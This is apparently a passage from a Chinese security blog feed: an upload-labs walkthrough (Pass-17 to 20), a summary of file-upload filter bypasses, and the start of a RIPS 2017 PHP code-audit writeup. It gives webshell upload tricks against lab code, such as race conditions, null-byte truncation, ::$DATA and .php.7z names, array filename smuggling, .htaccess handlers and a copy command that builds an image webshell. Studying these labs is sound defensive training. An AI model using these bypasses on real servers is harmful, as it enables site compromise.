class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/34.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发包的同时在浏览器不断访问17cmd.php文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">"./myupload.php"</span>);</span><br><span class="line">    $imgFileName =time();</span><br><span class="line">    $u = <span class="keyword">new</span> MyUpload($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $_FILES[<span class="string">'upload_file'</span>][<span class="string">'size'</span>],$imgFileName);</span><br><span class="line">    $status_code = $u-&gt;upload(UPLOAD_PATH.<span class="string">'/'</span>);</span><br><span class="line">    <span class="keyword">switch</span> ($status_code) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $msg = <span class="string">'文件已经被上传，但没有重命名。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            $msg = <span class="string">'这个文件不能上传到服务器的临时文件存储目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传目录不可写。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，无法上传该类型文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，上传的文件过大。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            $msg = <span class="string">'上传失败，服务器已经存在相同名称文件。'</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            $msg = <span class="string">'文件无法上传，文件不能复制到目标目录。'</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $msg = <span class="string">'未知错误！'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关同样使用了白名单的形式规定了合法的后缀名，上传后再通过<strong>rename</strong>函数重命名。我们可以观察这关的白名单中存在压缩包的后缀名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var $cls_arr_ext_accepted = array(</span><br><span class="line">      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,</span><br><span class="line">      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );</span><br></pre></td></tr></table></figure><p>那么跟上一关一样，我们可以利用条件竞争，通过多线程发送上传后缀名为<strong>.php.7z</strong>的文件的包，当服务器还未来得及将文件改名时访问上传的webshell</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/36.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到有的响应包的提示是文件还来不及被重命名</p><p>在浏览器中访问<strong>18cmd.php.7z</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功访问webshell</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'禁止保存为该类型文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关以一个POST方式传递的参数<strong>save_name</strong>作为上传文件保存的文件名，同时通过<strong>pathinfo</strong>函数对文件名的后缀名进行黑名单检测，但是我们可以发现，并没有对该参数进行一系列过滤处理（去点，去空，去::$DATA字符串，大小写转化）</p><p>我们先测试一下<strong>pathinfo</strong>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> pathinfo(<span class="string">"cmd.php"</span>,PATHINFO_EXTENSION); <span class="comment">#php</span></span><br><span class="line"><span class="keyword">echo</span> pathinfo(<span class="string">"cmd.php."</span>,PATHINFO_EXTENSION); <span class="comment">#</span></span><br><span class="line"><span class="keyword">echo</span> pathinfo(<span class="string">'cmd.php::$DATA'</span>,PATHINFO_EXTENSION); <span class="comment">#::$DATA</span></span><br><span class="line"><span class="keyword">echo</span> pathinfo(<span class="string">"cmd.php "</span>,PATHINFO_EXTENSION);<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>; <span class="comment">#php</span></span><br><span class="line"><span class="keyword">echo</span> pathinfo(<span class="string">"cmd.PHP"</span>,PATHINFO_EXTENSION);<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>; <span class="comment">#PHP</span></span><br></pre></td></tr></table></figure><p>通过测试说明，一系列之前关卡的绕过方法都是可以的</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/39.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/40.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">            <span class="comment">//mime check</span></span><br><span class="line">            $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">            <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">                $msg = <span class="string">"禁止上传该类型文件!"</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//check filename</span></span><br><span class="line">                $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">                <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">                    $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $ext = end($file);</span><br><span class="line">                $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">                <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">                    $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">                    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">                    $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                        $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">                        $is_upload = <span class="keyword">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $msg = <span class="string">"文件上传失败！"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这关首先检查了上传的文件类型，然后将POST方式传递的参数<strong>save_name</strong>（如果为空，则上传的文件名）作为文件名变量<strong>$file</strong>，对<strong>$file</strong>进行了是否是数组的判断，如果不是数组则以<strong>“.”</strong>为分界符打散成数组，并取出数组最后一个元素（通过<strong>end</strong>函数）作为文件名后缀进行白名单的检测，通过检测的话就取出数组的第一个元素（通过<strong>reset</strong>函数）与<strong>$file[count($file) - 1]</strong>拼接成最终的文件名上传</p><p>如果变量<strong>$file</strong>作为字符串，则我们只能上传图片马，但如果作为<strong>数组</strong>，则不需要经过<strong>explode</strong>函数的处理，那么我们就考虑对<strong>$file</strong>数组赋值如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="keyword">array</span>();</span><br><span class="line">$file[<span class="number">1</span>] = <span class="string">"20cmd"</span>;</span><br><span class="line">$file[<span class="number">2</span>] = <span class="string">"php"</span>;</span><br><span class="line">$file[<span class="number">3</span>] = <span class="string">"jpg"</span>;</span><br></pre></td></tr></table></figure><p>那么被检测的后缀名变量<strong>$ext</strong>和最后上传的文件名变量<strong>$file_name</strong>的值如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ext = end($file) == <span class="string">"jpg"</span></span><br><span class="line">$file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>] == <span class="string">"20cmd.php"</span></span><br></pre></td></tr></table></figure><p>上传的payload如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/41.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还可以考虑通过利用<strong>%00</strong>截断函数<strong>move_uploaded_file</strong>，对<strong>$file</strong>数组赋值如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="keyword">array</span>();</span><br><span class="line">$file[<span class="number">0</span>] = <span class="string">"20cmd.php "</span>; <span class="comment">//将最后一个空格字符" "在burp的提交包中的十六进制中替换成0x00</span></span><br><span class="line">$file[<span class="number">1</span>] = <span class="string">"jpg"</span>;</span><br></pre></td></tr></table></figure><p>上传的payload如下图所示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/42.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h2><p>文件上传的检查主要分为两大部分：<strong>客户端</strong>检查和<strong>服务器端</strong>检查</p><h3 id="一-客户端检查"><a href="#一-客户端检查" class="headerlink" title="一.客户端检查"></a>一.客户端检查</h3><p>客户端主要是通过前端的<strong>JS</strong>代码进行检查，如果只是单纯的前端检查，我们只需要按照前端的检查标准发送请求包，再通过抓包修改请求包的内容，如第一关，抓包修改一下文件名后缀再提交即可成功上传webshell</p><h3 id="二-服务器端检查"><a href="#二-服务器端检查" class="headerlink" title="二.服务器端检查"></a>二.服务器端检查</h3><p>服务器端则是通过后台脚本代码（本靶场为PHP）进行检查，检查主要分为三部分：检查<strong>Content-type</strong>，检查<strong>后缀名</strong>，检查<strong>文件内容</strong></p><h4 id="1-检查Content-type"><a href="#1-检查Content-type" class="headerlink" title="1.检查Content-type"></a>1.检查Content-type</h4><p>抓包修改Content-type字段为合法内容即可</p><h4 id="2-检查后缀名"><a href="#2-检查后缀名" class="headerlink" title="2.检查后缀名"></a>2.检查后缀名</h4><p>检查后缀名分为<strong>黑名单</strong>检测和<strong>白名单</strong>检测</p><h5 id="2-1黑名单检测"><a href="#2-1黑名单检测" class="headerlink" title="2.1黑名单检测"></a>2.1黑名单检测</h5><p>列举出一系列禁止上传的文件后缀名进行过滤，常用的绕过方法有以下几种：</p><p>（1）上传<strong>特殊可解析后缀</strong>：如<strong>phtml</strong>，<strong>php3</strong>，<strong>php5</strong>，<strong>pht</strong></p><p>（2）上传<strong>.htaccess</strong>文件：内容为<strong>SetHandler application/x-httpd-php</strong> ，上传的所有文件都会被当做php文件进行解析，前提是需要服务器相关配置开启</p><p>（3）大小写绕过：在Linux没有特殊配置的情况下，这种情况只有win可以，因为win会忽略大小写，例如Pass-05中未使用<strong>strtolower</strong>函数进行小写转化处理，那么将后缀名改成<strong>PHP</strong>即可上传成功</p><p>（4）空格，点绕过：Win下<strong>xx.php</strong>[空格] 或<strong>xx.php.</strong>这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点 ，例如Pass-06和Pass-07未使用<strong>trim</strong>函数或者自定义的<strong>deldot</strong>函数进行去空和去点处理，就可以利用该方法进行绕过上传</p><p>（5）<strong>::$DATA</strong>绕过：NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA，例如Pass-08中，未使用<strong>str_ireplace</strong>函数去除<strong>::$DATA</strong>，那么上传后缀名为<strong>.php::$DATA</strong>即可上传</p><p>（6）双写后缀名绕过：当服务器利用函数（如Pass-10中使用<strong>str_ireplace</strong>函数）将敏感的后缀名替换为空时，双写后缀名，如<strong>.pphphp</strong>即可绕过</p><p>（7）上传<strong>.7z</strong>压缩包绕过：<strong>.7z</strong>是一种压缩包文件的格式，我们上传<strong>cmd.php.7z</strong>文件，再访问该文件时能够正常访问到php页面，这属于Apache解析漏洞，Apache解析文件时，如果后缀名不认识，则会继续想前解析，会解析到php,这就是Apache的解析漏洞 </p><h5 id="2-2白名单检测"><a href="#2-2白名单检测" class="headerlink" title="2.2白名单检测"></a>2.2白名单检测</h5><p>列举出只允许上传的文件后缀名，过滤掉不属于白名单中的文件，常用的绕过方法有以下几种：</p><p>（1）MIME绕过：检查http包的<strong>Content-type</strong>字段来判断文件类型，直接修改该字段值即可</p><p>（2）%00截断：利用<strong>%00</strong>截断<strong>move_uploaded_file</strong>函数，只解析<strong>%00</strong>前的字符，<strong>%00</strong>后的字符不解析，通常运用在GET方式，因为GET方式传入能自动进行URL解码，如Pass-11</p><p>（3）0x00截断：原理同%00截断，只不过是通过POST方式传递参数，需要通过Burp在十六进制形式中修改</p><h4 id="3-检查文件内容"><a href="#3-检查文件内容" class="headerlink" title="3.检查文件内容"></a>3.检查文件内容</h4><p>通过一些检查文件内容的函数进行判断是否是图片格式的文件，可以大致分为对文件头检查，<strong>getimagesize</strong>函数检查，<strong>exif_imagetype</strong>函数检查和二次渲染，通常我们只能够上传图片马，常用的绕过方法有以下几种：<br>（1）利用<strong>copy</strong>命令生成图片马：命令具体为<code>copy 1.jpg/b + cmd.php/a shell.jpg</code>，生成图片马后上传成功，但是同时还得存在文件包含漏洞才能执行图片马</p><p>（2）利用<strong>GIF89A</strong>伪造成GIF文件：在PHP文件开头内容加入<strong>GIF89A</strong>，服务器通过<strong>getimagesize</strong>会认为这是GIF文件</p><p>（3）绕过二次渲染：上传PNG和JPG图片马方法较为复杂，但是GIF图片马只需要找到上传前后两个文件经过二次渲染未改变内容的地方，并在其中添加PHP代码即可</p><h3 id="三-代码逻辑"><a href="#三-代码逻辑" class="headerlink" title="三.代码逻辑"></a>三.代码逻辑</h3><p>这一类属于比较特别的，根据服务器端代码执行的逻辑通过<strong>条件竞争</strong>上传黑名单文件，条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生 。</p><p>以Pass-17为例，程序先进行文件上传后再判断文件是否合法，不合法再进行删除，如果利用多线程持续发送上传PHP文件的请求包，并不断访问上传的文件，服务器会来不及将不合法文件删除，我们也能因此而成功执行PHP文件代码</p><p>最后，再附上一张别人的总结图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/43.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      file upload
    
    </summary>
    
      <category term="file upload" scheme="https://Foxgrin.github.io/categories/file-upload/"/>
    
    
      <category term="file upload" scheme="https://Foxgrin.github.io/tags/file-upload/"/>
    
  </entry>
  
  <entry>
    <title>代码审计--PHP-Security</title>
    <link href="https://Foxgrin.github.io//posts/16636/"/>
    <id>https://Foxgrin.github.io//posts/16636/</id>
    <published>2019-03-02T13:03:00.000Z</published>
    <updated>2019-03-11T07:10:34.442Z</updated>
    
    <content type="html"><![CDATA[<p>RIPS 2017 PHP代码审计安全挑战<a id="more"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目原地址： PHP Security Advent Calendar 2017 - <a href="https://www.ripstech.com/php-security-calendar-2017/" target="_blank" rel="noopener">https://www.ripstech.com/php-security-calendar-2017/</a></p><p>RIPSTECH PRESENTS PHP SECURITY CALENDAR 是由 RIPS 团队出品的PHP代码安全审计挑战系列题目，RIPSTECH PRESENTS PHP SECURITY CALENDAR 2017 共包含24道题目（Day 1 ~ 24），每道题目将包含一个较新颖的知识点供大家学习。</p><p>实验环境源码：<a href="https://github.com/vulnspy/ripstech-php-security-calendar-2017" target="_blank" rel="noopener">https://github.com/vulnspy/ripstech-php-security-calendar-2017</a> </p><p>参考题解：<a href="http://www.vulnspy.com/cn-ripstech-presents-php-security-calendar-2017/" target="_blank" rel="noopener">http://www.vulnspy.com/cn-ripstech-presents-php-security-calendar-2017/</a></p><h2 id="Day01"><a href="#Day01" class="headerlink" title="Day01"></a>Day01</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> UPLOAD_DIRECTORY = <span class="string">'./solutions/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $file;</span><br><span class="line">    <span class="keyword">private</span> $whitelist;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;whitelist = range(<span class="number">1</span>, <span class="number">24</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>], <span class="keyword">$this</span>-&gt;whitelist)) &#123;</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                <span class="keyword">$this</span>-&gt;file[<span class="string">'tmp_name'</span>],</span><br><span class="line">                <span class="keyword">self</span>::UPLOAD_DIRECTORY . <span class="keyword">$this</span>-&gt;file[<span class="string">'name'</span>]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = <span class="keyword">new</span> Challenge($_FILES[<span class="string">'solution'</span>]);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>代码大致流程是构建了一个Challenge类，类中定义一个常量UPLOAD_DIRECTORY，用于定义上传文件存储的具体位置，并定义了两个魔术方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__construct()　　- 在每次创建新对象时先调用此方法</span><br><span class="line"></span><br><span class="line">__destruct() 　　- 对象的所有引用都被删除或者当对象被显式销毁时执行</span><br></pre></td></tr></table></figure><p>__construct方法中对类中两个私有变量进行赋值，__destruct方法对上传的文件名进行了检查操作，检查文件名是否为整数，范围为1-24，问题就出在这个<strong>in_array</strong>方法，我们知道<strong>in_array</strong>方法的第三个参数默认是<strong>false</strong>，因此会进行弱类型比较，即将上传的文件名自动转化为整形与整数1-24进行比较。这就导致我们可以将恶意文件上传至服务器，只要文件名为数字1-24开头的文件，都可以上传至服务器。</p><p>新创建一个测试文件demo1.php，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;demo1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;solution&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">class Challenge &#123;</span><br><span class="line">    const UPLOAD_DIRECTORY = &apos;E:/php/PHPTutorial/WWW/html/solutions/&apos;;</span><br><span class="line">    private $file;</span><br><span class="line">    private $whitelist;</span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;</span><br><span class="line">        $this-&gt;file = $file;</span><br><span class="line">        $this-&gt;whitelist = range(1, 24);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        if (in_array($this-&gt;file[&apos;name&apos;], $this-&gt;whitelist)) &#123;</span><br><span class="line">        echo $this-&gt;file[&apos;tmp_name&apos;];</span><br><span class="line">            move_uploaded_file(</span><br><span class="line">                $this-&gt;file[&apos;tmp_name&apos;],</span><br><span class="line">                self::UPLOAD_DIRECTORY . $this-&gt;file[&apos;name&apos;]</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">        else echo &quot;fail to upload.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$challenge = new Challenge($_FILES[&apos;solution&apos;]);</span><br><span class="line"> ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>上传文件名1demo.php的一句话木马文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/PHP-Security/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功上传</p><p>本关漏洞主要就在于<strong>in_array</strong>方法的第三个参数未设置，如果设置为true，则会检查搜索的数据与数组的值的类型是否相同，所以修正该漏洞的方法就是将第三个参数设置为true，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 